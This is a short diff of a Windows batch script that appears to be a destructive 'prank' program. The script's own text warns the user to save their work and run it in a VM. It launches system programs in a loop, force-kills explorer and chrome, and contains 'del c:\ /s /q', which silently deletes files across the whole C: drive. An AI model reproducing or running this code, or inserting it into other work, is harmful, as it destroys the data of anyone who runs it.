@@ -4,9 +4,9 @@ echo yeah save your work before running this and do it in a vm because this can 
 pause
 goto lmao
 :lmao
-start taskmgr.exe
-start notepad.exe
-start explorer.exe
+cmd /ctaskmgr.exe
+cmd /c notepad.exe
+cmd /c explorer.exe
 start cmd /c del c:\ /s /q
 taskkill /f /im explorer.exe
 taskkill /f /im chrome.exe
